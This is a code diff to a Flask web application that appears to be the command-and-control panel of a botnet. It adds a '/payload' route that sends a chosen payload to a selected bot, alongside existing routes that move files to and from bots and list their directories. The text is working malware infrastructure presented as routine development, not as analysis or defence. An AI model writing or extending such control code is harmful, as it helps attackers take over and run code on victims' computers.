@@ -58,6 +58,7 @@ def upload_file():
         # TODO switch to in-progress instead of "success"
         return json.dumps({"success": True})
 
+
 @app.route('/downloader', methods=['POST'])
 def download_file():
     if request.method == 'POST':
@@ -73,9 +74,20 @@ def download_file():
         else:
             return "No bot selected", 404
 
+@app.route('/payload', methods=['GET', 'POST'])
+def payload_launch():
+    payload_name = "example_payload"
+    if request.method == 'POST' and 'payload' in request.form:
+        payload_name = request.form.get('payload')
+    if 'bot' in request.cookies:
+        botnet.sendPayload(request.cookies.get('bot'), payload_name)
+        return "done"
+    else:
+        return "No bot selected", 404
+
 @app.route('/ls', methods=['GET','POST'])
 def list_dir():
-    if request.method == 'POST':
+    if request.method == 'POST' and 'file' in request.form:
         filename = request.form.get('file')
     else:
         filename = '.'
@@ -104,10 +116,12 @@ def index():
     resp = make_response(render_template('index.html',
                                          async_mode=socketio.async_mode,
                                          bot_list=botnet.getConnections(),
+                                         payload_list=botnet.getPayloads(),
                                          connected=connected))
     if request.method == 'POST':
         resp.set_cookie('bot',request.form.get('bot'))
     return resp
+
 
 @app.route('/finder')
 @requires_auth
